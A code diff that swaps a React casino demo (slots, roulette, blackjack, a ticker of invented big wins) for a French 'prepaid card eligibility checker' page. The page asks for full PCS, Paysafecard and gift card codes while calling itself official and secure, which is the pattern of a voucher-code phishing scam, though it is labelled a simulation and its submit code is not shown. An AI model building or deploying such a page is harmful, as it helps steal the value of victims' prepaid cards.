@@ -1,750 +1,279 @@
-“use client”;
-import { useEffect, useRef, useCallback, useState } from “react”;
-
-// ── Textarea primitive ──────────────────────────────────────────────
-const Textarea = ({ className = “”, …props }) => (
-
-  <textarea
-    className={`flex min-h-[80px] w-full rounded-md border border-neutral-700 bg-transparent px-3 py-2 text-sm placeholder:text-neutral-500 focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-yellow-500 disabled:opacity-50 resize-none ${className}`}
-    {...props}
-  />
-);
-
-// ── Auto-resize hook ────────────────────────────────────────────────
-function useAutoResizeTextarea({ minHeight, maxHeight }) {
-  const textareaRef = useRef(null);
-  const adjustHeight = useCallback((reset) => {
-    const ta = textareaRef.current;
-    if (!ta) return;
-    if (reset) { ta.style.height = `${minHeight}px`; return; }
-    ta.style.height = `${minHeight}px`;
-    ta.style.height = `${Math.max(minHeight, Math.min(ta.scrollHeight, maxHeight ?? Infinity))}px`;
-  }, [minHeight, maxHeight]);
-  useEffect(() => { if (textareaRef.current) textareaRef.current.style.height = `${minHeight}px`; }, [minHeight]);
-  useEffect(() => {
-    const h = () => adjustHeight();
-    window.addEventListener("resize", h);
-    return () => window.removeEventListener("resize", h);
-  }, [adjustHeight]);
-  return { textareaRef, adjustHeight };
-}
-
-// ── Casino AI Chat ──────────────────────────────────────────────────
-const BOT_REPLIES = [
-  "🎰 Place your bet and let fate decide! Minimum bet is $10.",
-  "♠️ Welcome to the High Roller table. Your current balance: $1,000.",
-  "🎲 The roulette wheel is hot tonight — three reds in a row!",
-  "🃏 Blackjack pays 3:2. Want to double down on that hand?",
-  "🏆 You're only $200 away from VIP status. Keep spinning!",
-  "💰 Tonight's jackpot stands at $48,320. Feeling lucky?",
-  "🎯 Tip: Slots near the entrance have the highest payout rates.",
-];
-
-function CasinoChatWidget({ onCommand }) {
-  const [value, setValue] = useState("");
-  const [messages, setMessages] = useState([
-    { role: "bot", text: "Welcome to ABYSS CASINO. I'm your AI concierge. Ask me anything — bets, rules, bonuses!" }
-  ]);
-  const [typing, setTyping] = useState(false);
-  const bottomRef = useRef(null);
-  const { textareaRef, adjustHeight } = useAutoResizeTextarea({ minHeight: 52, maxHeight: 160 });
-
-  const send = useCallback(() => {
-    const trimmed = value.trim();
-    if (!trimmed) return;
-    setMessages(m => [...m, { role: "user", text: trimmed }]);
-    setValue(""); adjustHeight(true);
-    onCommand && onCommand(trimmed);
-    setTyping(true);
-    setTimeout(() => {
-      setTyping(false);
-      setMessages(m => [...m, { role: "bot", text: BOT_REPLIES[Math.floor(Math.random() * BOT_REPLIES.length)] }]);
-    }, 900 + Math.random() * 600);
-  }, [value, adjustHeight, onCommand]);
-
-  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: "smooth" }); }, [messages, typing]);
-
-  return (
-    <div style={{
-      position: "fixed", bottom: 24, right: 24, width: 340,
-      background: "rgba(10,8,20,0.92)", border: "1px solid rgba(212,175,55,0.4)",
-      borderRadius: 16, boxShadow: "0 0 40px rgba(212,175,55,0.15), 0 0 80px rgba(120,40,200,0.2)",
-      backdropFilter: "blur(16px)", zIndex: 1000, display: "flex", flexDirection: "column", overflow: "hidden"
-    }}>
-      {/* Header */}
-      <div style={{
-        padding: "12px 16px", background: "linear-gradient(90deg,rgba(212,175,55,0.15),rgba(120,40,200,0.15))",
-        borderBottom: "1px solid rgba(212,175,55,0.2)", display: "flex", alignItems: "center", gap: 10
-      }}>
-        <div style={{
-          width: 32, height: 32, borderRadius: "50%",
-          background: "radial-gradient(circle,#d4af37,#7c28c8)",
-          display: "flex", alignItems: "center", justifyContent: "center",
-          fontSize: 16, boxShadow: "0 0 12px rgba(212,175,55,0.5)"
-        }}>🎴</div>
-        <div>
-          <div style={{ color: "#d4af37", fontFamily: "serif", fontWeight: 700, fontSize: 13, letterSpacing: 1 }}>ABYSS CONCIERGE</div>
-          <div style={{ color: "#7c28c8", fontSize: 10, letterSpacing: 2 }}>AI POWERED • LIVE</div>
-        </div>
-        <div style={{ marginLeft: "auto", width: 8, height: 8, borderRadius: "50%", background: "#22c55e", boxShadow: "0 0 6px #22c55e" }} />
-      </div>
-
-      {/* Messages */}
-      <div style={{ flex: 1, overflowY: "auto", padding: "12px 14px", maxHeight: 240, minHeight: 120, display: "flex", flexDirection: "column", gap: 8 }}>
-        {messages.map((m, i) => (
-          <div key={i} style={{
-            display: "flex", justifyContent: m.role === "user" ? "flex-end" : "flex-start"
-          }}>
-            <div style={{
-              maxWidth: "82%", padding: "8px 12px", borderRadius: m.role === "user" ? "14px 14px 4px 14px" : "14px 14px 14px 4px",
-              background: m.role === "user"
-                ? "linear-gradient(135deg,#d4af37,#b8922e)"
-                : "rgba(255,255,255,0.07)",
-              color: m.role === "user" ? "#000" : "#e2d9f3",
-              fontSize: 12, lineHeight: 1.5,
-              border: m.role === "bot" ? "1px solid rgba(212,175,55,0.15)" : "none",
-            }}>{m.text}</div>
-          </div>
-        ))}
-        {typing && (
-          <div style={{ display: "flex", gap: 4, padding: "8px 12px" }}>
-            {[0,1,2].map(i => (
-              <div key={i} style={{
-                width: 6, height: 6, borderRadius: "50%", background: "#d4af37",
-                animation: `bounce 1s ${i * 0.15}s infinite`,
-              }} />
-            ))}
-          </div>
-        )}
-        <div ref={bottomRef} />
-      </div>
-
-      {/* Input */}
-      <div style={{ padding: "10px 12px", borderTop: "1px solid rgba(212,175,55,0.15)" }}>
-        <div style={{ display: "flex", gap: 8, alignItems: "flex-end" }}>
-          <Textarea
-            ref={textareaRef}
-            value={value}
-            onChange={e => { setValue(e.target.value); adjustHeight(); }}
-            onKeyDown={e => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); send(); } }}
-            placeholder="Ask about bets, rules, bonuses…"
-            style={{ flex: 1, minHeight: 52, color: "#e2d9f3", fontSize: 12 }}
-          />
-          <button
-            onClick={send}
-            style={{
-              width: 36, height: 36, borderRadius: "50%", border: "none", cursor: "pointer",
-              background: value.trim() ? "linear-gradient(135deg,#d4af37,#b8922e)" : "rgba(255,255,255,0.08)",
-              color: value.trim() ? "#000" : "#666",
-              display: "flex", alignItems: "center", justifyContent: "center", fontSize: 16,
-              transition: "all .2s", flexShrink: 0
-            }}
-          >↑</button>
-        </div>
-        <div style={{ display: "flex", gap: 6, marginTop: 8, flexWrap: "wrap" }}>
-          {["Clone Screenshot", "Import Figma", "Upload Wallet", "Landing Page"].map(l => (
-            <button key={l} onClick={() => { setValue(l); }}
-              style={{
-                padding: "3px 8px", borderRadius: 20, fontSize: 10,
-                background: "rgba(212,175,55,0.08)", border: "1px solid rgba(212,175,55,0.2)",
-                color: "#d4af37", cursor: "pointer", transition: "all .2s"
-              }}>{l}</button>
-          ))}
-        </div>
-      </div>
-    </div>
-  );
-}
-
-// ── Slot Machine ────────────────────────────────────────────────────
-const SYMBOLS = ["🍒","💎","7️⃣","🎰","⭐","🍋","🔔","💰"];
-function SlotMachine({ onWin }) {
-  const [reels, setReels] = useState([["🍒","💎","7️⃣"],["🍋","🎰","⭐"],["🔔","💰","🍒"]]);
-  const [spinning, setSpinning] = useState(false);
-  const [result, setResult] = useState(null);
-  const [bet, setBet] = useState(10);
-
-  const spin = () => {
-    if (spinning) return;
-    setSpinning(true); setResult(null);
-    const intervals = [0,1,2].map(i =>
-      setInterval(() => {
-        setReels(r => { const n = [...r]; n[i] = [SYMBOLS[Math.floor(Math.random()*8)],SYMBOLS[Math.floor(Math.random()*8)],SYMBOLS[Math.floor(Math.random()*8)]]; return n; });
-      }, 80 + i * 40)
-    );
-    [800, 1100, 1400].forEach((delay, i) => {
-      setTimeout(() => {
-        clearInterval(intervals[i]);
-        if (i === 2) {
-          setSpinning(false);
-          const final = [0,1,2].map(() => SYMBOLS[Math.floor(Math.random()*8)]);
-          setReels([
-            [final[0], SYMBOLS[Math.floor(Math.random()*8)], SYMBOLS[Math.floor(Math.random()*8)]],
-            [final[1], SYMBOLS[Math.floor(Math.random()*8)], SYMBOLS[Math.floor(Math.random()*8)]],
-            [final[2], SYMBOLS[Math.floor(Math.random()*8)], SYMBOLS[Math.floor(Math.random()*8)]],
-          ]);
-          if (final[0] === final[1] && final[1] === final[2]) {
-            const prize = bet * (final[0] === "💎" ? 100 : final[0] === "7️⃣" ? 50 : 10);
-            setResult({ win: true, amount: prize });
-            onWin && onWin(prize);
-          } else if (final[0] === final[1] || final[1] === final[2]) {
-            setResult({ win: true, amount: bet * 2 });
-          } else {
-            setResult({ win: false });
-          }
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérificateur d'Éligibilité - Cartes Prépayées</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
         }
-      }, delay);
-    });
-  };
-
-  return (
-    <div style={{
-      background: "linear-gradient(145deg,rgba(20,10,40,0.9),rgba(40,20,10,0.9))",
-      border: "2px solid rgba(212,175,55,0.4)", borderRadius: 20,
-      padding: 24, textAlign: "center", position: "relative",
-      boxShadow: "0 0 30px rgba(212,175,55,0.2), inset 0 0 30px rgba(0,0,0,0.5)"
-    }}>
-      <div style={{ color: "#d4af37", fontFamily: "serif", fontSize: 13, letterSpacing: 3, marginBottom: 16, textTransform: "uppercase" }}>Slot Temple</div>
-
-      {/* Reels */}
-      <div style={{ display: "flex", gap: 8, justifyContent: "center", marginBottom: 16 }}>
-        {reels.map((reel, ri) => (
-          <div key={ri} style={{
-            width: 72, height: 180, overflow: "hidden",
-            background: "rgba(0,0,0,0.6)", borderRadius: 10,
-            border: "1px solid rgba(212,175,55,0.3)",
-            display: "flex", flexDirection: "column", alignItems: "center",
-            position: "relative"
-          }}>
-            {/* Win line highlight */}
-            <div style={{
-              position: "absolute", top: "50%", left: 0, right: 0, height: 60,
-              transform: "translateY(-50%)", background: "rgba(212,175,55,0.06)",
-              border: "1px solid rgba(212,175,55,0.2)", pointerEvents: "none"
-            }} />
-            {reel.map((sym, si) => (
-              <div key={si} style={{
-                width: "100%", height: 60, display: "flex", alignItems: "center",
-                justifyContent: "center", fontSize: 28,
-                transition: spinning ? "none" : "all .3s",
-                filter: si === 0 ? "drop-shadow(0 0 8px rgba(212,175,55,0.6))" : "none"
-              }}>{sym}</div>
-            ))}
-          </div>
-        ))}
-      </div>
-
-      {/* Bet */}
-      <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 12, marginBottom: 16 }}>
-        <span style={{ color: "#888", fontSize: 12 }}>BET</span>
-        {[5,10,25,50,100].map(b => (
-          <button key={b} onClick={() => setBet(b)} style={{
-            padding: "4px 10px", borderRadius: 20, fontSize: 11, cursor: "pointer",
-            background: bet === b ? "linear-gradient(135deg,#d4af37,#b8922e)" : "rgba(255,255,255,0.05)",
-            border: bet === b ? "none" : "1px solid rgba(212,175,55,0.2)",
-            color: bet === b ? "#000" : "#d4af37", transition: "all .2s"
-          }}>${b}</button>
-        ))}
-      </div>
-
-      {/* Spin button */}
-      <button onClick={spin} disabled={spinning} style={{
-        width: "100%", padding: "14px 0", borderRadius: 12, border: "none", cursor: spinning ? "default" : "pointer",
-        background: spinning ? "rgba(255,255,255,0.05)" : "linear-gradient(135deg,#d4af37 0%,#b8922e 50%,#d4af37 100%)",
-        backgroundSize: "200% 200%",
-        color: spinning ? "#555" : "#000", fontWeight: 800, fontSize: 15,
-        letterSpacing: 3, textTransform: "uppercase",
-        boxShadow: spinning ? "none" : "0 0 20px rgba(212,175,55,0.4)",
-        transition: "all .3s",
-        animation: !spinning ? "shimmer 2s linear infinite" : "none"
-      }}>
-        {spinning ? "SPINNING…" : "SPIN"}
-      </button>
-
-      {/* Result */}
-      {result && (
-        <div style={{
-          marginTop: 14, padding: "10px 16px", borderRadius: 10,
-          background: result.win ? "rgba(34,197,94,0.12)" : "rgba(239,68,68,0.12)",
-          border: `1px solid ${result.win ? "rgba(34,197,94,0.4)" : "rgba(239,68,68,0.3)"}`,
-          color: result.win ? "#22c55e" : "#ef4444", fontSize: 13, fontWeight: 700,
-          animation: "fadeIn .4s ease"
-        }}>
-          {result.win ? `🏆 WIN $${result.amount}!` : "💸 No luck this time…"}
+        .tab-active {
+            border-bottom: 4px solid #1E40AF;
+            color: white;
+            font-weight: 600;
+        }
+        .result-eligible {
+            background-color: #10B981;
+            color: white;
+        }
+        .result-not-eligible {
+            background-color: #EF4444;
+            color: white;
+        }
+    </style>
+</head>
+<body class="bg-[#0A192F] text-white min-h-screen">
+    <div class="max-w-2xl mx-auto pt-8 px-4">
+        <!-- Header -->
+        <div class="flex items-center justify-between mb-8">
+            <div>
+                <h1 class="text-2xl font-bold tracking-tight">Vérificateur d'Éligibilité</h1>
+                <p class="text-blue-300 text-sm">Cartes Prépayées Officiel (Simulation)</p>
+            </div>
+            <div class="flex items-center gap-2 text-blue-400">
+                <i class="fas fa-shield-alt text-xl"></i>
+                <span class="text-sm font-medium">100% Sécurisé</span>
+            </div>
         </div>
-      )}
-    </div>
-  );
-}
 
-// ── Roulette ────────────────────────────────────────────────────────
-const ROULETTE_NUMS = Array.from({length: 37}, (_,i) => i);
-const RED_NUMS = [1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36];
-
-function Roulette() {
-  const [spinning, setSpinning] = useState(false);
-  const [result, setResult] = useState(null);
-  const [bet, setBet] = useState({ type: "red", amount: 10 });
-  const [rotation, setRotation] = useState(0);
-  const rafRef = useRef(null);
-
-  const spin = () => {
-    if (spinning) return;
-    setSpinning(true); setResult(null);
-    const totalSpin = 720 + Math.random() * 1440;
-    const start = performance.now();
-    const duration = 3000;
-    const startRot = rotation;
-    const animate = (now) => {
-      const elapsed = now - start;
-      const t = Math.min(elapsed / duration, 1);
-      const ease = 1 - Math.pow(1 - t, 4);
-      setRotation(startRot + totalSpin * ease);
-      if (t < 1) { rafRef.current = requestAnimationFrame(animate); }
-      else {
-        const finalAngle = (startRot + totalSpin) % 360;
-        const numIdx = Math.floor((finalAngle / 360) * 37);
-        const num = ROULETTE_NUMS[numIdx];
-        const isRed = RED_NUMS.includes(num);
-        const won = (bet.type === "red" && isRed) || (bet.type === "black" && !isRed && num !== 0) || (bet.type === "even" && num % 2 === 0 && num !== 0) || (bet.type === "odd" && num % 2 === 1);
-        setResult({ number: num, red: isRed, won, prize: won ? bet.amount * 2 : 0 });
-        setSpinning(false);
-      }
-    };
-    rafRef.current = requestAnimationFrame(animate);
-  };
-
-  useEffect(() => () => rafRef.current && cancelAnimationFrame(rafRef.current), []);
-
-  const wheelColors = ["#1a1a2e","#c0392b"];
-
-  return (
-    <div style={{
-      background: "linear-gradient(145deg,rgba(0,20,10,0.9),rgba(10,30,15,0.9))",
-      border: "2px solid rgba(34,197,94,0.3)", borderRadius: 20,
-      padding: 24, textAlign: "center",
-      boxShadow: "0 0 30px rgba(34,197,94,0.15)"
-    }}>
-      <div style={{ color: "#22c55e", fontFamily: "serif", fontSize: 13, letterSpacing: 3, marginBottom: 16 }}>ROULETTE</div>
-
-      {/* Wheel */}
-      <div style={{ position: "relative", width: 180, height: 180, margin: "0 auto 20px" }}>
-        <svg viewBox="0 0 180 180" style={{ transform: `rotate(${rotation}deg)`, transition: "none", width: "100%", height: "100%" }}>
-          <circle cx="90" cy="90" r="88" fill="#1a1a1a" stroke="rgba(212,175,55,0.5)" strokeWidth="2"/>
-          {ROULETTE_NUMS.map((n, i) => {
-            const angle = (i / 37) * 360;
-            const rad = (angle * Math.PI) / 180;
-            const x = 90 + 70 * Math.sin(rad);
-            const y = 90 - 70 * Math.cos(rad);
-            return (
-              <g key={n}>
-                <line x1="90" y1="90" x2={90 + 88 * Math.sin(rad)} y2={90 - 88 * Math.cos(rad)}
-                  stroke="rgba(212,175,55,0.2)" strokeWidth="0.5"/>
-                <circle cx={x} cy={y} r="9"
-                  fill={n === 0 ? "#22c55e" : RED_NUMS.includes(n) ? "#c0392b" : "#1a1a1a"}
-                  stroke="rgba(212,175,55,0.4)" strokeWidth="0.5"/>
-                <text x={x} y={y + 4} textAnchor="middle" fill="white" fontSize="6" fontWeight="bold">{n}</text>
-              </g>
-            );
-          })}
-          <circle cx="90" cy="90" r="18" fill="rgba(20,10,5,0.95)" stroke="rgba(212,175,55,0.6)" strokeWidth="2"/>
-          <text x="90" y="95" textAnchor="middle" fill="#d4af37" fontSize="14">⚙</text>
-        </svg>
-        {/* Ball indicator */}
-        <div style={{
-          position: "absolute", top: -6, left: "50%", transform: "translateX(-50%)",
-          width: 12, height: 12, borderRadius: "50%", background: "white",
-          boxShadow: "0 0 8px white"
-        }}/>
-      </div>
-
-      {/* Bet type */}
-      <div style={{ display: "flex", gap: 6, justifyContent: "center", flexWrap: "wrap", marginBottom: 12 }}>
-        {[["red","🔴 Red"],["black","⚫ Black"],["even","Even"],["odd","Odd"]].map(([type, label]) => (
-          <button key={type} onClick={() => setBet(b => ({...b, type}))} style={{
-            padding: "5px 12px", borderRadius: 20, fontSize: 11, cursor: "pointer",
-            background: bet.type === type ? "rgba(212,175,55,0.2)" : "rgba(255,255,255,0.05)",
-            border: `1px solid ${bet.type === type ? "rgba(212,175,55,0.6)" : "rgba(255,255,255,0.1)"}`,
-            color: bet.type === type ? "#d4af37" : "#888", transition: "all .2s"
-          }}>{label}</button>
-        ))}
-      </div>
-
-      <button onClick={spin} disabled={spinning} style={{
-        width: "100%", padding: "12px 0", borderRadius: 12, border: "none", cursor: spinning ? "default" : "pointer",
-        background: spinning ? "rgba(255,255,255,0.05)" : "linear-gradient(135deg,#22c55e,#16a34a)",
-        color: spinning ? "#555" : "#000", fontWeight: 800, fontSize: 14, letterSpacing: 2,
-        boxShadow: spinning ? "none" : "0 0 20px rgba(34,197,94,0.3)", transition: "all .3s"
-      }}>
-        {spinning ? "SPINNING…" : "PLACE BET & SPIN"}
-      </button>
-
-      {result && (
-        <div style={{
-          marginTop: 12, padding: "10px 16px", borderRadius: 10,
-          background: result.won ? "rgba(34,197,94,0.12)" : "rgba(239,68,68,0.12)",
-          border: `1px solid ${result.won ? "rgba(34,197,94,0.4)" : "rgba(239,68,68,0.3)"}`,
-          color: result.won ? "#22c55e" : "#ef4444", fontSize: 13
-        }}>
-          Number {result.number} ({result.number === 0 ? "Green" : result.red ? "Red" : "Black"})
-          {result.won ? ` — WIN $${result.prize}! 🏆` : " — You lost. Try again!"}
+        <!-- Tabs -->
+        <div class="flex border-b border-blue-900 mb-8">
+            <button onclick="switchTab(0)" id="tab-0" class="tab-active px-8 py-4 text-lg flex-1">PCS</button>
+            <button onclick="switchTab(1)" id="tab-1" class="px-8 py-4 text-lg flex-1 hover:text-white">Paysafecard</button>
+            <button onclick="switchTab(2)" id="tab-2" class="px-8 py-4 text-lg flex-1 hover:text-white">Carte Cadeau</button>
         </div>
-      )}
-    </div>
-  );
-}
 
-// ── Blackjack ───────────────────────────────────────────────────────
-const SUITS = ["♠","♥","♦","♣"];
-const RANKS = ["A","2","3","4","5","6","7","8","9","10","J","Q","K"];
-const newDeck = () => SUITS.flatMap(s => RANKS.map(r => ({ suit: s, rank: r })));
-const shuffle = d => { const a = [...d]; for (let i = a.length-1; i > 0; i--) { const j = Math.floor(Math.random()*(i+1)); [a[i],a[j]]=[a[j],a[i]]; } return a; };
-const cardVal = r => r === "A" ? 11 : ["J","Q","K"].includes(r) ? 10 : parseInt(r);
-const handVal = cards => {
-  let v = cards.reduce((s, c) => s + cardVal(c.rank), 0);
-  let aces = cards.filter(c => c.rank === "A").length;
-  while (v > 21 && aces--) v -= 10;
-  return v;
-};
+        <!-- Content Container -->
+        <div id="content" class="bg-white text-gray-900 rounded-3xl shadow-2xl p-8 min-h-[420px]">
+            <!-- PCS Tab -->
+            <div id="panel-0">
+                <h2 class="text-2xl font-semibold mb-2">Vérification d'éligibilité – Carte PCS</h2>
+                <p class="text-gray-600 mb-6">Entrez le code complet de votre carte PCS (16 chiffres)</p>
+                
+                <div class="space-y-6">
+                    <div>
+                        <input id="input-0" type="text" maxlength="19" 
+                               placeholder="XXXX-XXXX-XXXX-XXXX"
+                               class="w-full px-5 py-4 border border-gray-300 rounded-2xl text-lg focus:outline-none focus:border-blue-600">
+                        <p id="error-0" class="text-red-500 text-sm mt-2 hidden"></p>
+                    </div>
+                    
+                    <button onclick="verify(0)" 
+                            class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-colors text-white font-semibold py-4 rounded-2xl text-lg">
+                        Vérifier mon éligibilité
+                    </button>
+                    
+                    <div id="result-0" class="hidden mt-4 p-5 rounded-2xl text-center text-lg font-medium"></div>
+                </div>
+            </div>
 
-function Card({ card, hidden }) {
-  const isRed = card.suit === "♥" || card.suit === "♦";
-  return (
-    <div style={{
-      width: 52, height: 76, borderRadius: 8,
-      background: hidden ? "linear-gradient(135deg,#1a1a3e,#2d1b69)" : "white",
-      border: "1px solid rgba(212,175,55,0.4)",
-      display: "flex", flexDirection: "column", alignItems: hidden ? "center" : "flex-start",
-      justifyContent: hidden ? "center" : "flex-start",
-      padding: hidden ? 0 : "4px 6px",
-      boxShadow: "0 4px 12px rgba(0,0,0,0.5)",
-      color: hidden ? "#d4af37" : isRed ? "#c0392b" : "#1a1a1a",
-      fontSize: hidden ? 22 : 14, fontWeight: "bold",
-      transition: "all .3s", flexShrink: 0
-    }}>
-      {hidden ? "🂠" : <><div>{card.rank}</div><div style={{fontSize:16}}>{card.suit}</div></>}
-    </div>
-  );
-}
+            <!-- Paysafecard Tab -->
+            <div id="panel-1" class="hidden">
+                <h2 class="text-2xl font-semibold mb-2">Vérification d'éligibilité – Paysafecard</h2>
+                <p class="text-gray-600 mb-6">Code à 16 chiffres (sans tiret)</p>
+                
+                <div class="space-y-6">
+                    <div>
+                        <input id="input-1" type="text" maxlength="16" 
+                               placeholder="1234567890123456"
+                               class="w-full px-5 py-4 border border-gray-300 rounded-2xl text-lg focus:outline-none focus:border-blue-600">
+                        <p id="error-1" class="text-red-500 text-sm mt-2 hidden"></p>
+                    </div>
+                    
+                    <button onclick="verify(1)" 
+                            class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-colors text-white font-semibold py-4 rounded-2xl text-lg">
+                        Vérifier
+                    </button>
+                    
+                    <div id="result-1" class="hidden mt-4 p-5 rounded-2xl text-center text-lg font-medium"></div>
+                </div>
+            </div>
 
-function Blackjack() {
-  const [deck, setDeck] = useState(shuffle(newDeck()));
-  const [player, setPlayer] = useState([]);
-  const [dealer, setDealer] = useState([]);
-  const [status, setStatus] = useState("idle"); // idle|playing|done
-  const [result, setResult] = useState(null);
-  const [bet, setBet] = useState(20);
-  const [balance, setBalance] = useState(1000);
-
-  const deal = () => {
-    const d = shuffle(newDeck());
-    const p = [d[0], d[2]], dl = [d[1], d[3]];
-    setDeck(d.slice(4)); setPlayer(p); setDealer(dl); setStatus("playing"); setResult(null);
-    setBalance(b => b - bet);
-    if (handVal(p) === 21) { endGame(p, dl, d.slice(4), true); }
-  };
-
-  const endGame = (p, dl, dk, instant) => {
-    let d = [...dl]; let dk2 = [...dk];
-    if (!instant) { while (handVal(d) < 17) { d = [...d, dk2.shift()]; } }
-    const pv = handVal(p), dv = handVal(d);
-    let res;
-    if (pv > 21) res = "bust";
-    else if (instant || dv > 21 || pv > dv) { res = "win"; setBalance(b => b + bet * 2); }
-    else if (pv === dv) { res = "push"; setBalance(b => b + bet); }
-    else res = "lose";
-    setDealer(d); setDeck(dk2); setStatus("done"); setResult(res);
-  };
-
-  const hit = () => {
-    const card = deck[0]; const rest = deck.slice(1);
-    const np = [...player, card]; setPlayer(np); setDeck(rest);
-    if (handVal(np) >= 21) endGame(np, dealer, rest, false);
-  };
-
-  const stand = () => endGame(player, dealer, deck, false);
-
-  const resultColors = { win: "#22c55e", lose: "#ef4444", bust: "#ef4444", push: "#d4af37" };
-  const resultText = { win: "🏆 You Win!", lose: "💸 Dealer Wins", bust: "💥 Bust!", push: "🤝 Push" };
-
-  return (
-    <div style={{
-      background: "linear-gradient(145deg,rgba(0,30,15,0.95),rgba(5,20,10,0.95))",
-      border: "2px solid rgba(34,197,94,0.25)", borderRadius: 20, padding: 24,
-      boxShadow: "0 0 30px rgba(34,197,94,0.1)"
-    }}>
-      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
-        <div style={{ color: "#d4af37", fontFamily: "serif", fontSize: 13, letterSpacing: 3 }}>BLACKJACK</div>
-        <div style={{ color: "#22c55e", fontSize: 13, fontWeight: 700 }}>Balance: ${balance}</div>
-      </div>
-
-      {/* Dealer */}
-      <div style={{ marginBottom: 16 }}>
-        <div style={{ color: "#888", fontSize: 10, letterSpacing: 2, marginBottom: 8 }}>
-          DEALER {status === "done" ? `(${handVal(dealer)})` : ""}
+            <!-- Gift Card Tab -->
+            <div id="panel-2" class="hidden">
+                <h2 class="text-2xl font-semibold mb-2">Vérification d'éligibilité – Carte Cadeau</h2>
+                <p class="text-gray-600 mb-6">Code cadeau (lettres + chiffres)</p>
+                
+                <div class="space-y-6">
+                    <div>
+                        <input id="input-2" type="text" 
+                               placeholder="GIFT-ABCD-1234"
+                               class="w-full px-5 py-4 border border-gray-300 rounded-2xl text-lg focus:outline-none focus:border-blue-600">
+                        <p id="error-2" class="text-red-500 text-sm mt-2 hidden"></p>
+                    </div>
+                    
+                    <button onclick="verify(2)" 
+                            class="w-full bg-[#0A192F] hover:bg-[#1E3A8A] transition-colors text-white font-semibold py-4 rounded-2xl text-lg">
+                        Vérifier
+                    </button>
+                    
+                    <div id="result-2" class="hidden mt-4 p-5 rounded-2xl text-center text-lg font-medium"></div>
+                </div>
+            </div>
         </div>
-        <div style={{ display: "flex", gap: 6, minHeight: 76 }}>
-          {dealer.map((c, i) => <Card key={i} card={c} hidden={status === "playing" && i === 1}/>)}
+
+        <!-- Footer -->
+        <div class="text-center text-blue-300 text-sm mt-10">
+            © 2025 - Outil de vérification officiel (simulation) • Usage à des fins de démonstration uniquement
         </div>
-      </div>
-
-      {/* Player */}
-      <div style={{ marginBottom: 16 }}>
-        <div style={{ color: "#888", fontSize: 10, letterSpacing: 2, marginBottom: 8 }}>
-          YOU {player.length ? `(${handVal(player)})` : ""}
-        </div>
-        <div style={{ display: "flex", gap: 6, minHeight: 76 }}>
-          {player.map((c, i) => <Card key={i} card={c} hidden={false}/>)}
-        </div>
-      </div>
-
-      {/* Result */}
-      {result && (
-        <div style={{
-          marginBottom: 12, padding: "8px 14px", borderRadius: 10, textAlign: "center",
-          background: `${resultColors[result]}18`, border: `1px solid ${resultColors[result]}55`,
-          color: resultColors[result], fontWeight: 700, fontSize: 14, animation: "fadeIn .4s"
-        }}>{resultText[result]}</div>
-      )}
-
-      {/* Bet */}
-      {status !== "playing" && (
-        <div style={{ display: "flex", gap: 6, marginBottom: 12, justifyContent: "center" }}>
-          {[10,20,50,100].map(b => (
-            <button key={b} onClick={() => setBet(b)} style={{
-              padding: "4px 12px", borderRadius: 20, fontSize: 11, cursor: "pointer",
-              background: bet === b ? "rgba(212,175,55,0.2)" : "rgba(255,255,255,0.05)",
-              border: `1px solid ${bet === b ? "rgba(212,175,55,0.5)" : "rgba(255,255,255,0.1)"}`,
-              color: bet === b ? "#d4af37" : "#666", transition: "all .2s"
-            }}>${b}</button>
-          ))}
-        </div>
-      )}
-
-      {/* Actions */}
-      <div style={{ display: "flex", gap: 8 }}>
-        {status !== "playing" ? (
-          <button onClick={deal} style={{
-            flex: 1, padding: "12px 0", borderRadius: 12, border: "none", cursor: "pointer",
-            background: "linear-gradient(135deg,#d4af37,#b8922e)",
-            color: "#000", fontWeight: 800, fontSize: 13, letterSpacing: 2,
-            boxShadow: "0 0 20px rgba(212,175,55,0.3)"
-          }}>DEAL</button>
-        ) : (
-          <>
-            <button onClick={hit} style={{
-              flex: 1, padding: "12px 0", borderRadius: 12, border: "none", cursor: "pointer",
-              background: "linear-gradient(135deg,#3b82f6,#2563eb)", color: "white",
-              fontWeight: 700, fontSize: 13, letterSpacing: 1
-            }}>HIT</button>
-            <button onClick={stand} style={{
-              flex: 1, padding: "12px 0", borderRadius: 12, border: "none", cursor: "pointer",
-              background: "linear-gradient(135deg,#ef4444,#dc2626)", color: "white",
-              fontWeight: 700, fontSize: 13, letterSpacing: 1
-            }}>STAND</button>
-          </>
-        )}
-      </div>
-    </div>
-  );
-}
-
-// ── Stats Ticker ────────────────────────────────────────────────────
-function LiveTicker() {
-  const [items, setItems] = useState([
-    "🏆 Alex W. won $4,820 on Diamond Slots",
-    "🎲 Player_99 hit Blackjack!",
-    "💰 Jackpot at $48,320 and climbing",
-    "⭐ VIP table now open — min bet $500",
-    "🔔 Sarah K. won $12,000 on Roulette Red",
-  ]);
-  const [idx, setIdx] = useState(0);
-  useEffect(() => { const t = setInterval(() => setIdx(i => (i+1) % items.length), 3000); return () => clearInterval(t); }, [items.length]);
-  return (
-    <div style={{
-      background: "rgba(212,175,55,0.08)", border: "1px solid rgba(212,175,55,0.2)",
-      borderRadius: 10, padding: "8px 16px", display: "flex", alignItems: "center", gap: 12,
-      overflow: "hidden"
-    }}>
-      <div style={{ color: "#d4af37", fontSize: 10, letterSpacing: 2, whiteSpace: "nowrap", flexShrink: 0 }}>LIVE</div>
-      <div style={{ color: "#e2d9f3", fontSize: 12, animation: "fadeIn .5s ease" }} key={idx}>{items[idx]}</div>
-    </div>
-  );
-}
-
-// ── Background Canvas ───────────────────────────────────────────────
-function CasinoBackground() {
-  const canvasRef = useRef(null);
-  useEffect(() => {
-    const canvas = canvasRef.current;
-    const ctx = canvas.getContext("2d");
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
